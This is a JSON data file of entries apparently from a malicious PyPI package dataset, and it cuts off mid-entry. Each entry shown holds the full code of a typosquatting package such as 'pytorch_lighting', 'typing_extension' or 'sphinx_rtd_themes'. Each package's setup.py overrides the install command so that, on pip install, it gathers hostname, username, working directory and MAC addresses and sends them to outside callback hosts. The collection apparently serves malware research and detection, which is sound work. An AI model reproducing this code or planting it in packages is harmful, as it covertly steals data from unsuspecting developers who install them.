        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"rl_vm_scheduling\",\n    version=\"93.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-compresai-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"compresai\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-compressa-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"compressa\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-compressi-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"compressi\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-easydicts-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"easydicts\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-fedddecorr-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"FeddDecorr\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-lanm-neo-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"lanm_neo\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-open-clips-torch-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"open_clips_torch\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-pytorch-lighting-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"pytorch_lighting\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-sphinx-rdt-theme-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"sphinx_rdt_theme\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-sphinx-rtd-themes-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"sphinx_rtd_themes\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-type-extension-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"type_extension\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-typing-extension-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in 